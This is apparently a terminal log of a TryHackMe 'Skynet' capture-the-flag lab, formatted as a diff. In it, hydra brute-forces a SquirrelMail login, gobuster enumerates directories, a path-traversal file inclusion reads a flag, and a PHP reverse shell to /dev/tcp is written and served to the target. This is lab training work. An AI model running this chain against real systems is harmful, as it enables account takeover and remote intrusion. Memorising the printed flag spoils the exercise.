@@ -1,0 +1,326 @@
+root@ip-10-80-99-50:~# cat attention.txt
+cat log1.txt
+wc -l log1.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+cat: log1.txt: No such file or directory
+wc: log1.txt: No such file or directory
+root@ip-10-80-99-50:~# cat attention.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+root@ip-10-80-99-50:~# wc -l log1.txt
+wc: log1.txt: No such file or directory
+root@ip-10-80-99-50:~# ls -la        
+total 464
+drwx------ 46 root root  4096 Oct 10 15:17 .
+drwxr-xr-x 27 root root  4096 Oct 10 15:08 ..
+drwx------  9 root root  4096 Jun  3 06:29 .BurpSuite
+-rw-------  1 root root  1412 Aug  3 13:06 .ICEauthority
+-rw-------  1 root root  1197 May 15 11:57 .Xauthority
+drwxr-xr-x 21 root root  4096 Sep 29 17:14 .ZAP
+drwxr-xr-x  5 root root  4096 May 14 06:21 .attackbox-menu-backup-20260514-062154
+lrwxrwxrwx  1 root root     9 Feb 27  2026 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3779 Jul  1 10:15 .bashrc
+-rw-r--r--  1 root root  3779 Jul  1 10:37 .bashrc.bak
+drwx------ 25 root root  4096 Sep 11 14:17 .cache
+drwxr-xr-x  2 root root  4096 Sep 11 12:20 .cargo-fix
+drwxr-xr-x  8 root root  4096 Mar 18  2026 .cme
+drwx------ 42 root root  4096 Sep 11 08:07 .config
+drwx------  3 root root  4096 Mar  3  2026 .dbus
+drwx------  3 root root  4096 Feb 25  2026 .docker
+drwx------  3 root root  4096 Sep 29 17:30 .gnupg
+drwx------  2 root root  4096 Mar  3  2026 .gvfs
+drwxr-xr-x  2 root root  4096 May 14 06:02 .icons
+drwxr-xr-x  4 root root  4096 Feb 25  2026 .java
+drwx------  3 root root  4096 May 15 12:14 .launchpadlib
+-rw-------  1 root root    20 Aug 31 15:46 .lesshst
+drwxr-xr-x  5 root root  4096 Jun  2 20:22 .local
+drwx------  3 root root  4096 May 15 12:22 .mozilla
+drwxr-xr-x 12 root root  4096 Sep 29 17:42 .msf4
+drwxr-xr-x  3 root root  4096 Jun 29 13:19 .npm
+drwxr-xr-x  8 root root  4096 Jun  2 20:22 .nxc
+drwx------  3 root root  4096 Feb 25  2026 .pki
+-rw-r--r--  1 root root   225 Apr 17 09:15 .profile
+-rw-r--r--  1 root root   189 Apr 17 09:15 .profile.bak
+-rw-------  1 root root     0 May  6 14:34 .psql_history
+-rw-------  1 root root    46 Mar 18  2026 .python_history
+-rw-r--r--  1 root root    66 Feb 25  2026 .selected_editor
+drwxr-xr-x  2 root root  4096 Sep 11 08:07 .set
+drwxr-xr-x  3 root root  4096 Mar 18  2026 .shiv
+drwx------  2 root root  4096 Mar 11  2026 .ssh
+drwxr-xr-x  2 root root  4096 Feb 27  2026 .sstimap
+drwxr-xr-x  2 root root  4096 Sep 11 10:39 .theHarvester
+drwxr-xr-x  2 root root  4096 May 14 06:02 .themes
+drwx------  6 root root  4096 May 15 12:22 .thunderbird
+-rw-------  1 root root 10068 Jun 29 14:35 .viminfo
+drwxr-xr-x  2 root root  4096 Apr 17 12:42 .vnc
+-rw-r--r--  1 root root   366 May 15 12:03 .wget-hsts
+drwxr-xr-x  3 root root  4096 Apr 23 16:41 .wpscan
+drwxr-xr-x  2 root root  4096 May  6  2024 CTFBuilder
+drwxr-xr-x  4 root root  4096 May 26 13:15 Desktop
+drwxr-xr-x  2 root root  4096 May  7 09:51 Documents
+drwxr-xr-x  2 root root  4096 Feb 25  2026 Downloads
+drwxr-xr-x  2 root root  4096 Feb 26  2026 Pictures
+drwxr-xr-x  3 root root  4096 Feb 26  2026 Postman
+drwxr-xr-x 48 root root  4096 Sep  4 15:27 Rooms
+drwxr-xr-x  4 root root  4096 Sep 29 17:42 Scripts
+drwxr-xr-x  3 root root  4096 Oct 10 15:17 THM
+drwxr-xr-x  2 root root  4096 May  7 09:39 Templates
+-rw-r--r--  1 root root  2715 Sep  2 19:52 arm1-uncontained.txt
+-rw-r--r--  1 root root  4564 Sep  2 20:00 arm2-contained.txt
+-rw-r--r--  1 root root  3952 Sep  2 20:09 arm2b-contained.txt
+-rw-r--r--  1 root root   163 Oct 10 15:15 attention.txt
+-rw-r--r--  1 root root  3179 Sep  2 20:39 full-suite.txt
+-rw-r--r--  1 root root 15336 Sep  3 12:27 full-suite2.txt
+drwxr-xr-x  3 root root  4096 Mar 18  2026 go
+-rw-r--r--  1 root root   431 Sep 11 10:39 install-th2.log
+-rw-r--r--  1 root root   221 Sep  3 12:18 msf-login.txt
+drwxr-xr-x  2 root root  4096 Apr 23 19:06 neoreg_servers
+drwxr-xr-x  3 root root  4096 May 15 06:40 reports
+drwx------  7 root root  4096 Sep 11 12:19 snap
+drwxr-xr-x  2 root root  4096 Sep 29 17:42 test-reports
+-rw-r--r--  1 root root 17370 Sep 29 17:19 test-results-freesmb.log
+-rw-r--r--  1 root root 17364 Sep 29 17:32 test-results-freesmb2.log
+lrwxrwxrwx  1 root root    46 May 15 04:07 theHarvester-wrapper.orig -> /usr/local/share/theHarvester/bin/theHarvester
+-rw-r--r--  1 root root 17368 Sep 11 13:01 tools-final.log
+-rw-r--r--  1 root root 17382 Sep 11 14:00 tools-postboot.log
+-rw-r--r--  1 root root 17384 Sep 11 10:53 tools-run.log
+-rw-r--r--  1 root root 17367 Sep 11 12:32 tools-run2.log
+-rw-r--r--  1 root root 17374 Sep 11 12:40 tools-run3.log
+-rw-r--r--  1 root root  2820 Sep  2 20:58 zap-gui-cat.txt
+-rw-r--r--  1 root root  3165 Sep  2 19:36 zapfix-fresh.txt
+-rw-r--r--  1 root root  2997 Sep  2 20:11 zapfix-restored.txt
+root@ip-10-80-99-50:~# cd /THM/                     
+bash: cd: /THM/: No such file or directory
+root@ip-10-80-99-50:~# cd THM/
+root@ip-10-80-99-50:~/THM# ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Oct 10 15:17 .
+drwx------ 46 root root 4096 Oct 10 15:17 ..
+drwxr-xr-x  2 root root 4096 Oct 10 15:20 Skynet
+root@ip-10-80-99-50:~/THM# cd Skynet/
+root@ip-10-80-99-50:~/THM/Skynet# ls -la
+total 16
+drwxr-xr-x 2 root root 4096 Oct 10 15:20 .
+drwxr-xr-x 3 root root 4096 Oct 10 15:17 ..
+-rw-r--r-- 1 root root  471 Oct 10 15:20 log1.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:20 log2.txt
+-rw-r--r-- 1 root root 2131 Oct 10 15:19 skynet_nmap.txt
+root@ip-10-80-99-50:~/THM/Skynet# ls -la
+total 16
+drwxr-xr-x 2 root root 4096 Oct 10 15:22 .
+drwxr-xr-x 3 root root 4096 Oct 10 15:17 ..
+-rw-r--r-- 1 root root  471 Oct 10 15:20 log1.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:20 log2.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:22 log3.txt
+-rw-r--r-- 1 root root 2131 Oct 10 15:19 skynet_nmap.txt
+root@ip-10-80-99-50:~/THM/Skynet# ls -la
+total 20
+drwxr-xr-x 2 root root 4096 Oct 10 15:22 .
+drwxr-xr-x 3 root root 4096 Oct 10 15:17 ..
+-rw-r--r-- 1 root root  163 Oct 10 15:22 attention.txt
+-rw-r--r-- 1 root root  471 Oct 10 15:20 log1.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:20 log2.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:22 log3.txt
+-rw-r--r-- 1 root root 2131 Oct 10 15:19 skynet_nmap.txt
+root@ip-10-80-99-50:~/THM/Skynet# cat attention.txt 
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+root@ip-10-80-99-50:~/THM/Skynet# cat log1.txt 
+cyborg007haloterminator
+terminator22596
+terminator219
+terminator20
+terminator1989
+terminator1988
+terminator168
+terminator16
+terminator143
+terminator13
+terminator123!@#
+terminator1056
+terminator101
+terminator10
+terminator02
+terminator00
+roboterminator
+pongterminator
+manasturcaluterminator
+exterminator95
+exterminator200
+dterminator
+djxterminator
+dexterminator
+determinator
+cyborg007haloterminator
+avsterminator
+alonsoterminator
+Walterminator
+79terminator6
+1996terminator
+root@ip-10-80-99-50:~/THM/Skynet# cat log2.txt 
+root@ip-10-80-99-50:~/THM/Skynet# cat log3.txt 
+root@ip-10-80-99-50:~/THM/Skynet# hydra -l milesdyson \
+-P log1.txt \
+"$RHOST" http-post-form \
+"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." \
+-t 4 -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-10 15:24:57
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 31 login tries (l:1/p:31), ~8 tries per task
+[DATA] attacking http-post-form://:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
+[ERROR] could not resolve address: 
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-10 15:24:57
+root@ip-10-80-99-50:~/THM/Skynet# cd ..
+root@ip-10-80-99-50:~/THM# cd ..
+root@ip-10-80-99-50:~# hydra -l milesdyson \
+-P log1.txt \
+"$RHOST" http-post-form \
+"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." \
+-t 4 -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-10 15:25:20
+[ERROR] File for passwords not found: log1.txt
+root@ip-10-80-99-50:~# cd T 
+THM/       Templates/ 
+root@ip-10-80-99-50:~# cd THM/Skynet/
+root@ip-10-80-99-50:~/THM/Skynet# hydra -l milesdyson \
+-P log1.txt \
+"$RHOST" http-post-form \
+"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." \
+-t 4 -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-10 15:25:38
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 31 login tries (l:1/p:31), ~8 tries per task
+[DATA] attacking http-post-form://:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
+[ERROR] could not resolve address: 
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-10 15:25:38
+root@ip-10-80-99-50:~/THM/Skynet# curl -s http://10.80.151.179/robots.txt
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.80.151.179 Port 80</address>
+</body></html>
+root@ip-10-80-99-50:~/THM/Skynet# export RHOST=10.80.151.179
+echo "$RHOST"
+10.80.151.179
+root@ip-10-80-99-50:~/THM/Skynet# cd ~/THM/Skynet
+
+ls -lh log1.txt
+wc -l log1.txt
+-rw-r--r-- 1 root root 471 Oct 10 15:20 log1.txt
+31 log1.txt
+root@ip-10-80-99-50:~/THM/Skynet# hydra -l milesdyson \
+-P log1.txt \
+10.80.151.179 http-post-form \
+"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." \
+-t 4 -f -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-10 15:29:10
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 31 login tries (l:1/p:31), ~8 tries per task
+[DATA] attacking http-post-form://10.80.151.179:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
+[ATTEMPT] target 10.80.151.179 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
+[ATTEMPT] target 10.80.151.179 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
+[ATTEMPT] target 10.80.151.179 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
+[ATTEMPT] target 10.80.151.179 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
+[80][http-post-form] host: 10.80.151.179   login: milesdyson   password: cyborg007haloterminator
+[STATUS] attack finished for 10.80.151.179 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-10 15:29:11
+root@ip-10-80-99-50:~/THM/Skynet# gobuster dir \
+-u http://10.80.151.179/45kra24zxs28v3yd/ \
+-w /usr/share/wordlists/dirb/common.txt \
+-x php,txt,html
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.80.151.179/45kra24zxs28v3yd/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,html,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 278]
+/.php                 (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.hta.html            (Status: 403) [Size: 278]
+/.hta.php             (Status: 403) [Size: 278]
+/.hta.txt             (Status: 403) [Size: 278]
+/.htaccess.php        (Status: 403) [Size: 278]
+/.htaccess.html       (Status: 403) [Size: 278]
+/.htaccess.txt        (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htpasswd.php        (Status: 403) [Size: 278]
+/.htpasswd.html       (Status: 403) [Size: 278]
+/.htpasswd.txt        (Status: 403) [Size: 278]
+/administrator        (Status: 301) [Size: 339] [--> http://10.80.151.179/45kra24zxs28v3yd/administrator/]
+/index.html           (Status: 200) [Size: 418]
+/index.html           (Status: 200) [Size: 418]
+Progress: 18456 / 18460 (99.98%)
+===============================================================
+Finished
+===============================================================
+root@ip-10-80-99-50:~/THM/Skynet# curl -sG \
+--data-urlencode "urlConfig=../../../../../../../../../home/milesdyson/user.txt" \
+"http://10.80.151.179/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php"
+<script>
+	function CloseDefaultAlert(){
+		SetAlert(false, "", "#alert");
+		setTimeout(function () {SetBlockade(false)}, 200);
+	}
+	function ShowAlert(){
+		_width = '';
+		_height = '';
+		jQuery('#alert').animate({width:parseInt(_width), height:parseInt(_height), 'margin-left':-(parseInt(_width)*0.5)+20, 'margin-top':-(parseInt(_height)*0.5)+20 }, 300, "easeInOutCirc", CompleteAnimation);
+			function CompleteAnimation(){
+				jQuery("#btnClose_alert").css('visibility', "visible");
+				jQuery("#description_alert").css('visibility', "visible");
+				jQuery("#content_alert").css('visibility', "visible");
+			}
+	}
+</script>
+<div class="alert_config_field" id="alert" style="z-index:;">
+    <div class="btnClose_alert" id="btnClose_alert" onclick="javascript:CloseDefaultAlert();"></div>
+	<div class="description_alert" id="description_alert"><b>Field configuration: </b></div>
+    <div class="separator" style="margin-bottom:15px;"></div>
+    <div id="content_alert" class="content_alert">
+        7ce5c2109a40f958099283600a9ae807
+    </div>
+root@ip-10-80-99-50:~/THM/Skynet# cd ~/THM/SkynetSkynet
+
+cat > shell.php <<'EOF'
+<?php
+system("bash -c 'bash -i >& /dev/tcp/10.80.99.50/4444 0>&1'");
+?>
+EOF
+root@ip-10-80-99-50:~/THM/Skynet# ls -la
+total 28
+drwxr-xr-x 2 root root 4096 Oct 10 15:43 .
+drwxr-xr-x 3 root root 4096 Oct 10 15:17 ..
+-rw-r--r-- 1 root root  163 Oct 10 15:22 attention.txt
+-rw-r--r-- 1 root root  117 Oct 10 15:36 important.txt
+-rw-r--r-- 1 root root  471 Oct 10 15:20 log1.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:20 log2.txt
+-rw-r--r-- 1 root root    0 Oct 10 15:22 log3.txt
+-rw-r--r-- 1 root root   72 Oct 10 15:43 shell.php
+-rw-r--r-- 1 root root 2131 Oct 10 15:19 skynet_nmap.txt
+root@ip-10-80-99-50:~/THM/Skynet# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.80.151.179 - - [10/Oct/2026 15:44:15] "GET /shell.php HTTP/1.0" 200 -
